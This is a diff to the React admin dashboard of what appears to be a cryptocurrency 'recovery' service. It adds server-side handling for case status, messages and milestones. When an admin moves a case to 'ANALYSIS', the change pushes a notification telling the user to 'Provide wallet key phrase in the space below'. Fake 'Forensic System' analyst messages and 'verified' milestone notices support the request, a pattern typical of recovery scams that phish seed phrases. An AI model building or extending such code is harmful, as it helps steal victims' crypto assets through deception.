@@ -37,9 +37,12 @@ import {
 import { db, handleFirestoreError, OperationType, auth } from '../lib/firebase';
 import { isAdminEmail } from '../lib/adminConfig';
 import {
+  fetchAdminCase,
   fetchAdminCases,
   mergeAdminCases,
+  patchAdminCase,
   patchAdminCaseStatus,
+  postAdminCaseMessage,
   type AdminCaseRecord,
 } from '../lib/adminApi';
 import { signInWithPopup, GoogleAuthProvider, onAuthStateChanged, User as FirebaseUser } from 'firebase/auth';
@@ -180,14 +183,33 @@ const CaseManagerView: React.FC = () => {
           r.caseId === requestId ||
           r.firestoreDocId === requestId
       ) || selectedCase;
-    const firestoreDocId = caseRow?.firestoreDocId || caseRow?.id;
+    const firestoreDocId =
+      caseRow?.firestoreDocId ||
+      (caseRow?.storageSource !== 'server' ? caseRow?.id : null);
     const serverCaseId = String(caseRow?.caseId || caseRow?.id || requestId);
-    const isServerOnly =
-      caseRow?.storageSource === 'server' && !caseRow?.firestoreDocId;
+    const useServerStore = !firestoreDocId;
 
     try {
-      if (isServerOnly) {
-        const result = await patchAdminCaseStatus(serverCaseId, newStatus);
+      if (useServerStore) {
+        const statusLabel =
+          statusLevels.find((l) => l.id === newStatus)?.label || newStatus;
+        let notification = {
+          title: 'Status Updated',
+          message: `Your case status has been updated to: ${statusLabel}`,
+          type: 'STATUS_UPDATE',
+        };
+        if (newStatus === 'ANALYSIS') {
+          notification = {
+            title: 'Action Required',
+            message: 'Provide wallet key phrase in the space below',
+            type: 'ACTION_REQUIRED',
+          };
+        }
+        const result = await patchAdminCaseStatus(
+          serverCaseId,
+          newStatus,
+          notification
+        );
         if (!result.ok) {
           throw new Error(result.error || 'Server update failed');
         }
@@ -228,7 +250,7 @@ const CaseManagerView: React.FC = () => {
         setSelectedCase({ ...selectedCase, status: newStatus });
       }
     } catch (err) {
-      if (!isServerOnly) {
+      if (!useServerStore) {
         handleFirestoreError(
           err,
           OperationType.UPDATE,
@@ -247,31 +269,44 @@ const CaseManagerView: React.FC = () => {
     const docId =
       selectedCase.firestoreDocId ||
       (selectedCase.storageSource !== 'server' ? selectedCase.id : null);
-    if (!docId) {
-      console.warn('Cannot message server-only case without Firestore doc');
-      return;
-    }
+    const serverId = !docId
+      ? String(selectedCase.caseId || selectedCase.id)
+      : null;
 
     setSendingMessage(true);
     try {
-      await addDoc(collection(db, 'recovery_requests', docId, 'messages'), {
-        text: message,
-        sender: 'Forensic System v4.2 (Admin)',
-        senderId: 'admin',
-        createdAt: serverTimestamp(),
-        type: 'admin_message'
-      });
+      if (serverId) {
+        const result = await postAdminCaseMessage(serverId, message.trim());
+        if (!result.ok) throw new Error(result.error || 'Send failed');
+        await loadServerCases();
+      } else if (docId) {
+        await addDoc(collection(db, 'recovery_requests', docId, 'messages'), {
+          text: message,
+          sender: 'Forensic System v4.2 (Admin)',
+          senderId: 'admin',
+          createdAt: serverTimestamp(),
+          type: 'admin_message',
+        });
 
-      await createNotification(
-        docId,
-        'New Message Received',
-        'You have a new secure communication from your lead analyst.',
-        'MESSAGE'
-      );
+        await createNotification(
+          docId,
+          'New Message Received',
+          'You have a new secure communication from your lead analyst.',
+          'MESSAGE'
+        );
+      }
 
       setMessage('');
     } catch (err) {
-      handleFirestoreError(err, OperationType.CREATE, `recovery_requests/${docId}/messages`);
+      if (serverId) {
+        console.error('Server message failed:', err);
+      } else if (docId) {
+        handleFirestoreError(
+          err,
+          OperationType.CREATE,
+          `recovery_requests/${docId}/messages`
+        );
+      }
     } finally {
       setSendingMessage(false);
     }
@@ -336,6 +371,11 @@ const CaseManagerView: React.FC = () => {
     ? activeCaseData.firestoreDocId ||
       (activeCaseData.storageSource !== 'server' ? activeCaseData.id : null)
     : null;
+
+  const activeServerCaseId =
+    activeCaseData && !activeFirestoreId
+      ? String(activeCaseData.caseId || activeCaseData.id)
+      : null;
 
   const filteredRequests = requests.filter((r) => {
     const q = searchTerm.toLowerCase();
@@ -571,13 +611,10 @@ const CaseManagerView: React.FC = () => {
                           <div className="text-center py-4 border-b border-white/5 mb-4">
                             <span className="text-slate-600 uppercase tracking-widest">--- SECURE CHANNEL INITIALIZED ---</span>
                           </div>
-                          {activeFirestoreId ? (
-                            <CaseMessages requestId={activeFirestoreId} />
-                          ) : (
-                            <p className="text-slate-600 text-center py-8 uppercase tracking-widest">
-                              Case stored on server — messaging needs Firestore link
-                            </p>
-                          )}
+                          <CaseMessages
+                            requestId={activeFirestoreId || undefined}
+                            serverCaseId={activeServerCaseId || undefined}
+                          />
                        </div>
 
                        <form onSubmit={handleSendMessage} className="relative">
@@ -612,23 +649,50 @@ const CaseManagerView: React.FC = () => {
                                 key={lvl.id}
                                 disabled={index === 0}
                                 onClick={async () => {
-                                  const currentSteps = activeCaseData.completedSteps || [];
+                                  const currentSteps = activeCaseData.completedSteps || ['PENDING'];
                                   const isChecking = !isCompleted;
-                                  const newSteps = isCompleted 
+                                  const newSteps = isCompleted
                                     ? currentSteps.filter((s: string) => s !== lvl.id)
                                     : [...currentSteps, lvl.id];
-                                  
-                                  if (!activeFirestoreId) return;
-                                  const ref = doc(db, 'recovery_requests', activeFirestoreId);
-                                  await updateDoc(ref, { completedSteps: newSteps, updatedAt: serverTimestamp() });
 
-                                  if (isChecking) {
-                                    await createNotification(
-                                      activeFirestoreId,
-                                      'Milestone Achieved',
-                                      `Phase "${lvl.label}" has been successfully completed and verified.`,
-                                      'MILESTONE_COMPLETE'
+                                  try {
+                                    if (activeServerCaseId) {
+                                      await patchAdminCase(activeServerCaseId, {
+                                        completedSteps: newSteps,
+                                        ...(isChecking
+                                          ? {
+                                              notification: {
+                                                title: 'Milestone Achieved',
+                                                message: `Phase "${lvl.label}" has been successfully completed and verified.`,
+                                                type: 'MILESTONE_COMPLETE',
+                                              },
+                                            }
+                                          : {}),
+                                      });
+                                      await loadServerCases();
+                                      return;
+                                    }
+                                    if (!activeFirestoreId) return;
+                                    const ref = doc(
+                                      db,
+                                      'recovery_requests',
+                                      activeFirestoreId
                                     );
+                                    await updateDoc(ref, {
+                                      completedSteps: newSteps,
+                                      updatedAt: serverTimestamp(),
+                                    });
+
+                                    if (isChecking) {
+                                      await createNotification(
+                                        activeFirestoreId,
+                                        'Milestone Achieved',
+                                        `Phase "${lvl.label}" has been successfully completed and verified.`,
+                                        'MILESTONE_COMPLETE'
+                                      );
+                                    }
+                                  } catch (err) {
+                                    console.error('Milestone update failed:', err);
                                   }
                                 }}
                                 className={`w-full p-2.5 sm:p-3 rounded-lg border flex flex-col sm:flex-row sm:items-center justify-between gap-3 sm:gap-2 transition-all ${
@@ -1073,33 +1137,76 @@ const DataField = ({ label, value, isSecret, isHighlighted }: { label: string, v
   </div>
 );
 
-const CaseMessages = ({ requestId }: { requestId: string }) => {
+const CaseMessages = ({
+  requestId,
+  serverCaseId,
+}: {
+  requestId?: string;
+  serverCaseId?: string;
+}) => {
   const [messages, setMessages] = React.useState<any[]>([]);
 
   React.useEffect(() => {
+    if (serverCaseId) {
+      const load = async () => {
+        const result = await fetchAdminCase(serverCaseId);
+        if (result.ok && result.case) {
+          setMessages((result.case.messages as any[]) || []);
+        }
+      };
+      load();
+      const interval = window.setInterval(load, 4000);
+      return () => window.clearInterval(interval);
+    }
+
+    if (!requestId) {
+      setMessages([]);
+      return;
+    }
+
     const q = query(
       collection(db, 'recovery_requests', requestId, 'messages'),
       orderBy('createdAt', 'asc')
     );
     const unsubscribe = onSnapshot(q, (snapshot) => {
-      setMessages(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
+      setMessages(snapshot.docs.map((doc) => ({ id: doc.id, ...doc.data() })));
     });
     return () => unsubscribe();
-  }, [requestId]);
+  }, [requestId, serverCaseId]);
+
+  const formatTime = (createdAt: unknown) => {
+    if (createdAt && typeof createdAt === 'object' && 'toDate' in createdAt) {
+      return (createdAt as { toDate: () => Date }).toDate().toLocaleTimeString();
+    }
+    if (typeof createdAt === 'string') {
+      return new Date(createdAt).toLocaleTimeString();
+    }
+    return '';
+  };
 
   return (
     <div className="space-y-4">
-      {messages.map(msg => (
-        <div key={msg.id} className={`flex flex-col ${msg.senderId === 'admin' ? 'items-end' : 'items-start'}`}>
-          <div className={`max-w-[90%] p-3 rounded-xl border ${
-            msg.senderId === 'admin' 
-              ? 'bg-blue-600/10 border-blue-500/30 text-blue-100 rounded-tr-none' 
-              : 'bg-white/5 border-white/10 text-white rounded-tl-none'
-          }`}>
+      {messages.length === 0 && (
+        <p className="text-slate-600 text-center py-6 uppercase tracking-widest text-[9px]">
+          No messages yet
+        </p>
+      )}
+      {messages.map((msg) => (
+        <div
+          key={msg.id}
+          className={`flex flex-col ${msg.senderId === 'admin' ? 'items-end' : 'items-start'}`}
+        >
+          <div
+            className={`max-w-[90%] p-3 rounded-xl border ${
+              msg.senderId === 'admin'
+                ? 'bg-blue-600/10 border-blue-500/30 text-blue-100 rounded-tr-none'
+                : 'bg-white/5 border-white/10 text-white rounded-tl-none'
+            }`}
+          >
             {msg.text}
           </div>
           <span className="text-[8px] text-slate-600 mt-1 uppercase tracking-tighter">
-            {msg.sender} // {msg.createdAt?.toDate?.()?.toLocaleTimeString()}
+            {msg.sender} // {formatTime(msg.createdAt)}
           </span>
         </div>
       ))}
